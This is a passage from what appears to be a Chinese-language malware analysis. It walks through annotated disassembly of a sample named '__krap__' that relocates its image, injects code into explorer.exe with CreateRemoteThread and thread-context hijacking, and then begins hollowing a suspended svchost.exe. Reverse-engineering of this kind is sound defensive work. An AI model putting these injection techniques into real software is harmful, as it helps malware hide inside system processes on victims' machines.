
```asm
    00401E04        0345 E0         add eax,dword ptr ss:[ebp-20]           // 定位到第一个节表
    00401E07        8B75 EC         mov esi,dword ptr ss:[ebp-14]
    00401E0A        8B48 34         mov ecx,dword ptr ds:[eax+34]           // 得到VirtualAddress
    00401E0D        8BFE            mov edi,esi
    00401E0F        2B7D F8         sub edi,dword ptr ss:[ebp-8]            // edi = dif（地址差值） == NtMapViewOfSection映射的地址 -  MapViewOfFile映射地址
    00401E12        83C4 0C         add esp,0C
    00401E15        034D F8         add ecx,dword ptr ss:[ebp-8]
    00401E18        66:8139 8DBE    cmp word ptr ds:[ecx],0BE8D             // 查找节中一段特征指令 lea edi,dword ptr ds:[esi+5000]
    00401E1D        75 09           jnz short __krap__.00401E28              //                      mov eax,dword ptr ds:[edi]
    00401E1F        8179 06 8B0709C>cmp dword ptr ds:[ecx+6],C009078B       //                      or eax,eax
    00401E26        74 03           je short __krap__.00401E2B
    00401E28        41              inc ecx
    00401E29      ^ EB ED           jmp short __krap__.00401E18
    00401E2B        8B49 02         mov ecx,dword ptr ds:[ecx+2]            // 取出上面指令中的0x5000 这个数字到ecx
    00401E2E        8B40 0C         mov eax,dword ptr ds:[eax+C]            // 定位第一个节的虚拟地址，0x1000
    00401E31        03C8            add ecx,eax
    00401E33        034D F8         add ecx,dword ptr ss:[ebp-8]            // 刚好得到第一个节的0x406000位置
    00401E36        EB 0D           jmp short __krap__.00401E45
    00401E38        83C1 08         add ecx,8
    00401E3B        EB 01           jmp short __krap__.00401E3E
    00401E3D        41              inc ecx
    00401E3E        66:3919         cmp word ptr ds:[ecx],bx                // 0x406000的位置是导入表函数名区域，不断比较是否00 00
    00401E41      ^ 75 FA           jnz short __krap__.00401E3D              // 好跳过该区域，该区域是一个索引，里面记录了偏移，用于
    00401E43        41              inc ecx                                 // 后面的重定位，设x_table[0 ~ n] 表示该区域内对应的索引
    00401E44        41              inc ecx                                 // 0xf0 是索引区域结束的标志
    00401E45        3919            cmp dword ptr ds:[ecx],ebx
    00401E47      ^ 75 EF           jnz short __krap__.00401E38
    00401E49        8B55 F4         mov edx,dword ptr ss:[ebp-C]
    00401E4C        83C1 04         add ecx,4
    00401E4F        8D5410 FC       lea edx,dword ptr ds:[eax+edx-4]
    00401E53        8A01            mov al,byte ptr ds:[ecx]
    00401E55        41              inc ecx
    00401E56        3AC3            cmp al,bl
    00401E58        74 26           je short __krap__.00401E80
    00401E5A        3C F0           cmp al,0F0
    00401E5C        73 07           jnb short __krap__.00401E65
    00401E5E        0FB6C0          movzx eax,al                           // mem_view_off = 映射区域第一个节代码的开始位置
    00401E61        03D0            add edx,eax                            // mem_view_off = x_table[n] + mem_view_off
    00401E63        EB 0F           jmp short __krap__.00401E74
    00401E65        0FB731          movzx esi,word ptr ds:[ecx]
    00401E68        83E0 0F         and eax,0F
    00401E6B        C1E0 10         shl eax,10
    00401E6E        0BC6            or eax,esi
    00401E70        03D0            add edx,eax
    00401E72        41              inc ecx
    00401E73        41              inc ecx
    00401E74        013A            add dword ptr ds:[edx],edi             // 对mem_view_off 重定位改写，每次通过
    00401E76        8A01            mov al,byte ptr ds:[ecx]               // dif（地址差值）来修正
    00401E78        41              inc ecx
    00401E79        3AC3            cmp al,bl
    00401E7B      ^ 75 DD           jnz short __krap__.00401E5A             // 例如：
    00401E7D        8B75 EC         mov esi,dword ptr ss:[ebp-14]          // 要注入代码的地址计算 = 映射地址（BE0000） - 自身ImageBase(400000) + 自身代码地址（401EF1）
    00401E80        2B75 F8         sub esi,dword ptr ss:[ebp-8]           // 最终要注入代码的地址 = 00FE1EF1
    00401E83        0375 08         add esi,dword ptr ss:[ebp+8]
    00401E86        395D 10         cmp dword ptr ss:[ebp+10],ebx
    00401E89        75 18           jnz short __krap__.00401EA3
    00401E8B        53              push ebx                               // 注入 00401EF1 <__krap__.inject_code> 地址代码到explorer中
    00401E8C        53              push ebx
    00401E8D        53              push ebx
    00401E8E        56              push esi
    00401E8F        53              push ebx
    00401E90        53              push ebx
    00401E91        FF75 0C         push dword ptr ss:[ebp+C]
    00401E94        FF15 8C304000   call dword ptr ds:[40308C]                ; kernel32.CreateRemoteThread
    00401E9A        50              push eax
    00401E9B        FF15 2C304000   call dword ptr ds:[40302C]                ; kernel32.CloseHandle
    00401EA1        EB 30           jmp short __krap__.00401ED3
    00401EA3        8D85 F4FCFFFF   lea eax,dword ptr ss:[ebp-30C]
    00401EA9        50              push eax
    00401EAA        FF75 10         push dword ptr ss:[ebp+10]
    00401EAD        C785 F4FCFFFF 0>mov dword ptr ss:[ebp-30C],10002          // 这段代码是在explorer.exe 注入svchost.exe中要走的流程，后面会有分析。
    00401EB7        FF15 88304000   call dword ptr ds:[403088]                // kernel32.GetThreadContext
    00401EBD        8D85 F4FCFFFF   lea eax,dword ptr ss:[ebp-30C]            // 取CONTEXT结构首地址
    00401EC3        50              push eax                                  // 压入CONTEXT结构首地址
    00401EC4        FF75 10         push dword ptr ss:[ebp+10]                // 压入 hThread
    00401EC7        89B5 A4FDFFFF   mov dword ptr ss:[ebp-25C],esi            // 修改CONTEXT.Eip = 新的注入代码地址
    00401ECD        FF15 84304000   call dword ptr ds:[403084]                // call  SetThreadContext
    00401ED3        FF75 F4         push dword ptr ss:[ebp-C]
    00401ED6        C645 FF 01      mov byte ptr ss:[ebp-1],1
    00401EDA        FF15 80304000   call dword ptr ds:[403080]                ; kernel32.UnmapViewOfFile
    00401EE0        FF75 E8         push dword ptr ss:[ebp-18]
    00401EE3        FF15 2C304000   call dword ptr ds:[40302C]                ; kernel32.CloseHandle
    00401EE9        8A45 FF         mov al,byte ptr ss:[ebp-1]
    00401EEC        5F              pop edi
    00401EED        5E              pop esi
    00401EEE        5B              pop ebx
    00401EEF        C9              leave
    00401EF0        C3              retn
```

#### 4 .`Explorer`在再注入`Svchost.exe`

```asm
    // 注入到explorer.exe中代码
    00E21EF1    55              push ebp
    00E21EF2    8BEC            mov ebp,esp
    00E21EF4    81EC 4C010000   sub esp,14C
    00E21EFA    56              push esi
    00E21EFB    68 D0070000     push 7D0
    00E21F00    FF15 7030E200   call dword ptr ds:[E23070]               ;  Sleep 休眠2秒
    00E21F06    33F6            xor esi,esi
    00E21F08    8D45 FC         lea eax,dword ptr ss:[ebp-4]
    00E21F0B    50              push eax
    00E21F0C    56              push esi
    00E21F0D    56              push esi
    00E21F0E    68 031DE200     push 0E21D03
    00E21F13    56              push esi
    00E21F14    56              push esi
    00E21F15    8975 FC         mov dword ptr ss:[ebp-4],esi             // 创建一个线程不停的去删除主运行程序文件,很简单不分析了。
    00E21F18    FF15 B430E200   call dword ptr ds:[E230B4]               //call  CreateThread
    00E21F1E    50              push eax
    00E21F1F    FF15 2C30E200   call dword ptr ds:[E2302C]               ; kernel32.CloseHandle
    // 注入svchost，这里使用了 CREATE_SUSPENDED CreateProcess + ResumeThread 方式注入
    // 相当于启动一个傀儡的进程svchost.exe,
    00E21F25    68 04010000     push 104
    00E21F2A    8D85 B4FEFFFF   lea eax,dword ptr ss:[ebp-14C]
    00E21F30    50              push eax
```
